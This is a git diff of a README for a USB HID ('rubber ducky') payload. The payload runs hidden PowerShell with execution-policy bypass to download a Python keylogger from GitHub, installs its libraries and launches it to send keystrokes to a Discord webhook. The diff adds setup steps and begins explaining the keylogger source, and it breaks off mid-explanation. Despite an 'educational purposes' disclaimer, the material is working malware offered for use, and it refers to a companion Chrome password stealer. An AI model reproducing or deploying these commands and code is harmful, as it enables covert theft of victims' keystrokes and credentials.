@@ -5,6 +5,11 @@ THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES
 
 This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.
 
+# Dependencies
+
+- Windows
+- Python
+
 # How it Works:
 
 ## The rubber ducky script
@@ -24,11 +29,33 @@ The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute
 - ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
 - Now the script proceecds to execute a sequence of commands
 
-  (copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)
+(copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)
 
-  ### Commands ran:
+### Commands ran:
 
-  1. First we run ```cd $env:USERPROFILE\Documents``` to enter the users Documents folder where we will be downloading our keylogger
-  2. Then we use ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py``` to download the ```logger.py``` script and place it in the Documents folder using -OutFile
-  3. Before running the python script we use ```py -m pip install discordwebhook pynput``` to download the needed python libraries (if these libraries are found pip skips this step and proceeds)
-  4. And last we do ```Python logger.py <Your discord webhook here>``` to run the python script and using our webhook as an argument which the python script uses
+1. First we run ```cd $env:USERPROFILE\Documents``` to enter the users Documents folder where we will be downloading our keylogger
+1 . Then we use ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile $Env:USERPROFILE\Documents\logger.py``` to download the ```logger.py``` script and place it in the Documents folder using -OutFile
+3. Before running the python script we use ```py -m pip install discordwebhook pynput``` to download the needed python libraries (if these libraries are found pip skips this step and proceeds)
+4. And last we do ```Python logger.py <Your discord webhook here>``` to run the python script and using our webhook as an argument which the python script uses
+ 
+## The keylogger script
+
+The logger script starts by importing the needed libraries which are downloaded in the previous step (some libraries are included by default in python)
+```python
+from pynput.keyboard import Key, Listener
+import time
+import threading
+from discordwebhook import Discord
+import sys
+```
+Now we tell python what our webhook is by using ```sys.argv[1]``` to take our argument (which we set to our webhook) and put it into the variable called ```hook_url``` Then we tell the discord library that our webhook is the ```hook_url``` which in turn is stored in the ```discord``` variable
+```python
+hook_url = sys.argv[1]
+discord = Discord(url=hook_url)
+```
+After that is set up we need to define some variables and lists that the logger will use. The ```word``` list is used 
+```python
+word = []
+last_pressed = time.time()
+idle_message = False
+```
